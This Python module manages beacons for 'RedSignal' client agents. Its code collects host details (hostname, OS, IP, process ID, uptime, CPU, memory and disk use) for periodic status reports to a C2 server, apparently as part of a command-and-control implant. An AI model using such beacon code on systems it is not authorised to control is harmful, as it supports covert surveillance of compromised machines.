"""
Beacon management for RedSignal client agents.
Handles periodic status reporting to C2 server.
"""

import time
import socket
import platform
import psutil
import os
from typing import Dict, Any

from ..common.protocol import BeaconMessage
from ..common.logger import get_logger

logger = get_logger(__name__)


class BeaconManager:
    """Manages beacon creation and transmission for client agents."""

    def __init__(self, client_id: str):
        self.client_id = client_id
        self.start_time = time.time()
        self.hostname = socket.gethostname()
        self.os_info = platform.platform()

    def create_beacon(self) -> BeaconMessage:
        """Create a beacon message with current system status."""
        try:
            current_process = psutil.Process()
            uptime = time.time() - self.start_time

            beacon = BeaconMessage(
                client_id=self.client_id,
                hostname=self.hostname,
                os_info=self.os_info,
                ip_address=self._get_primary_ip(),
                process_id=current_process.pid,
                uptime=uptime,
            )

            logger.debug(f"Created beacon for client {self.client_id}")
            return beacon

        except Exception as e:
            logger.error(f"Failed to create beacon: {e}")
            # Return minimal beacon on error
            return BeaconMessage(
                client_id=self.client_id,
                hostname=self.hostname,
                os_info="Unknown",
                ip_address="127.0.0.1",
                process_id=os.getpid(),
                uptime=0.0,
            )

    def _get_primary_ip(self) -> str:
        """Get the primary IP address of this system."""
        try:
            # Get the IP used to reach the internet
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except Exception:
            try:
                # Fallback to hostname resolution
                return socket.gethostbyname(socket.gethostname())
            except Exception:
                return "127.0.0.1"

    def get_extended_status(self) -> Dict[str, Any]:
        """Get extended system status for detailed beacons."""
        try:
            return {
                "cpu_percent": psutil.cpu_percent(interval=1),
                "memory_percent": psutil.virtual_memory().percent,
                "disk_usage": psutil.disk_usage("/").percent
                if os.name != "nt"
                else psutil.disk_usage("C:").percent,
                "network_connections": len(psutil.net_connections()),
                "boot_time": psutil.boot_time(),
                "load_average": os.getloadavg() if hasattr(os, "getloadavg") else [0, 0, 0],
            }
        except Exception as e:
            logger.warning(f"Failed to get extended status: {e}")
            return {}

